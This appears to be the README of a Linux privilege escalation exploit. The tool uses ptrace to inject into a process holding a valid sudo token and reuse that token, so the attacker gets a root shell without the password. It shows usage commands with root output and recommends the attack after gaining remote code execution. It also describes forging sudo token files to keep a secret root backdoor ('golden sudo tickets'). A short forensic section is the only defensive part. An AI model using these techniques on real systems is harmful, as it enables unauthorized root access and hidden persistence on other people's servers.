# [Linux] Privilege Escalation by injecting process posseding sudo tokens.

#### Inject process that have valid sudo token and activate our own sudo token.

## How to use
PS: read requirements!!
```sh
$ sudo whatever
[sudo] password for user:    # Press <ctrl>+c since you don't have the password. # This creates an invalid sudo tokens.
$ ./exploit.sh # This activates our sudo token.
.... wait 3 seconds
$ sudo -i # no password required :)
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Requirements
=> Ptrace (for this implementation)

=> A currently living process that has a valid sudo token with the same uid.

```
The default password timeout is 15 minutes. So if you use sudo twice in 15 minutes (900 seconds), you will not be asked to type the userâ€™s password again.
```
## Usecase

This is far from a generic privesc without requirements but it works, for instance if you have a RCE and don't have the user password but the user uses sudo then you can easily get root by stealing his token.

## Going further

### Forensic, DFIR ?

Printing to be improved but each process sudo attempt has one entry in /var/run/sudo/ts/[username]
```sh
./read_sudo_token_forensic  < /var/run/sudo/ts/user
version, flags, uid, sid, starttime_sec, starttime_nsec
2, 0, 0, 0, 0, 0
2, 0, 1001, 1145, 188, 660000000
2, 0, 1001, 24878, 7461, 490000000
2, 0, 1001, 24578, 6974, 10000000
```

### Arbitrary write to root

If you have an abitrary write you can create a sudo token for you current process to gain root code execution.
checkout './write_sudo_token $$ > /var/run/sudo/ts/[username]' in extra_tools,

### Golden sudo tickets

A very good way to create a secret root backdoor on servers that rarely reboots.
Not done yet but checkout './write_sudo_token $$' in ./extra_tools

### Why

I was looking for a way to steal dead process sudo token, but it doesn't look possible because they are associated by ((process start time and process session id) or (tty start time and tty session id)), and everything can be impressionnated except the start times which are relative to system boot time.
